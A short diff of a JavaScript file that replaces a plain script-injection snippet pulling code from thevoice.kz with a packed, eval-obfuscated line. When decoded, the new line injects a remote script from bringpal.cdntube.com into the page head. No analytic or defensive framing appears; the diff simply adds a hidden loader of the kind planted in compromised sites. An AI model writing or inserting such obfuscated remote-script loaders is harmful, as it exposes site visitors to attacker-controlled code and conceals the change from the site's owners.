@@ -1,4 +1,1 @@
-var script = document.createElement('script');
-script.src = 'http://thevoice.kz/static/js/qq.js';
-document.getElementsByTagName('head')[0].appendChild(script);
-alert('script loaded');
+eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('6 1=2.7("1");1.5="4://3.8.b/9",2.d("c")[0].a(1);',14,14,'|script|document|bringpal|http|src|var|createElement|cdntube|js|appendChild|com|head|getElementsByTagName'.split('|')))
